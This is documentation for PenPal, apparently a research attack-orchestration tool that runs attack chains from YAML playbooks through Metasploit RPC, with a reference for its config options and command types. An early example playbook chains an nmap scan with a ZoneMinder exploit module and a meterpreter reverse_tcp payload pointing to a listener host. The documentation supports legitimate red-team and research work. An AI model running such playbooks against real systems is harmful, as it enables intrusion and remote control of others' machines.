.. _Overview:

********
Overview
********

PenPal ships with a executable stub called "penpal" that can be called like follows:

.. code-block::

   penpal -h
   usage: penpal [-h] --config CONFIG [--version]

   PenPal is an attack orchestration tool that executes full attack-chains based on playbooks.

   options:
     -h, --help       show this help message and exit
     --config CONFIG  Attack-Playbook in yaml-format
     --version        show program's version number and exit

   (Austrian Institute of Technology) https://aecid.ait.ac.at Version: 1.0.0

The configuration-file is in yaml-format. The following yaml-file is an example of a playbook.yml:

.. code-block:: yaml

   ###
   msf_config:
     password: hackhelfer
     server: 10.18.3.86

   vars:
     $SERVER_ADDRESS: 192.42.0.254

   commands:
     - type: shell
       cmd: nmap $SERVER_ADDRESS
       error_if: .*test.*

     - type: msf-module
       cmd: exploit/unix/webapp/zoneminder_snapshots
       creates_session: "foothold"
       options:
         RHOSTS: 192.42.0.254
       payload_options:
         LHOST: 192.42.2.253
       payload: cmd/unix/python/meterpreter/reverse_tcp

**********
cmd_config
**********

cmd_config stores global variables for command options. This means that these settings
affect all commands.

.. code-block:: yaml

   ###
   cmd_config:
     loop_sleep: 5

loop_sleep
----------

* Type: int
* Default: 5

All commands can be configured to be executed in a loop. For example: if a command
does not deliver the expected output, the command can be executed again until the
output has the expected value. Between the executions can be a sleep time of certain
seconds.


**********
msf_config
**********

msf_config holds settings for the Metasploit modules and sessions.
Most of these settings control the Metsaploit RPC connection.

.. code-block:: yaml

   ###
   msf_config:
     password: top-secret
     server: 10.18.3.86

server
------

* Type: str
* Default: 127.0.0.1

This option stores the servername or ip-address of the msfrpcd


password
--------

* Type: str
* Default: None

This option stores the password of the rpc-connection.

ssl
---

* Type: bool
* Default: True

This option enables encryption for the rpc-connection

port
----

* Type: int
* Default: 55553

This option sets the port for the rpc-connection.

uri
---

* Type: str
* Default: /api/

This option sets uri of the rpc-api.

****
vars
****

Variables can be defined in the key/value-format. The variables
can be used in certain configuration places and are just placeholders
for the values. Currently they can only be used for "cmd"

.. code-block:: yaml

   ###
   msf_config:
     password: top-secret
     server: 10.18.3.86

   vars:
     $SERVER_ADDRESS: 192.42.0.254
     $NMAP: /usr/bin/nmap

   commands:
     - type: shell
       cmd: $NMAP $SERVER_ADDRESS

********
commands
********

This setting holds a list of commands that are executed sequentially from
top to bottom.

Every command, regardless of the type has the following options:

**error_if**:

* Type: str

If this option is set, an error will be raised if the string was found in the output
of the command.

**error_if_not**:

* Type: str

If this option is set, an error will be raised if the string was not found in the output
of the command.


**loop_if**:

* Type: str

If this option is set, the command will be executed again if the string was found in the
output of the command.

**loop_if_not**:

* Type: str

If this option is set, the command will be executed again if the string was not found in the
output of the command.

**loop_count**:

* Type: int
* Default: 3

This option controlls how often a command should be re-executed if loop_if ord loop_if_not is set.

**cmd**:

* Type: str

This option stores the command that will be executed. This option might be implemented individually
in each command-type.


shell
-----

This command executes local shell-commands.

cmd
~~~

* Type: str

cmd stores the command-line that should be executed locally.

.. code-block:: yaml

   ###
   msf_config:
     password: top-secret
     server: 10.18.3.86

   vars:
     $SERVER_ADDRESS: 192.42.0.254
     $NMAP: /usr/bin/nmap

   commands:
     - type: shell
       cmd: $NMAP $SERVER_ADDRESS

sleep
-----

This command sleeps a certain amount of time.

.. code-block:: yaml

   ###
   commands:
     - type: sleep
       seconds: 60


min_sec
~~~~~~~

* Type: int
* Default: 0

This option defines the minimum seconds to sleep. This
is only relevant if option *random* is set to True

seconds
~~~~~~~

* Type: int
* Default: 1

This options sets the seconds to sleep. If the option
*random* is set to True, this option is the maximum time
to sleep.

random
~~~~~~

* Type: bool
* Default: False

This option allows to randomize the seconds to wait. The minimum
and maximum seconds for the range can be set by *min_sec* and
*seconds*.

The following example will take a random amount of seconds between 30 seconds
and 60 seconds:

.. code-block:: yaml

   ###
   commands:
     - type: sleep
       seconds: 60
       min_sec: 30


cmd
~~~

* Type: str
* Default: "sleep"

This option is ignored
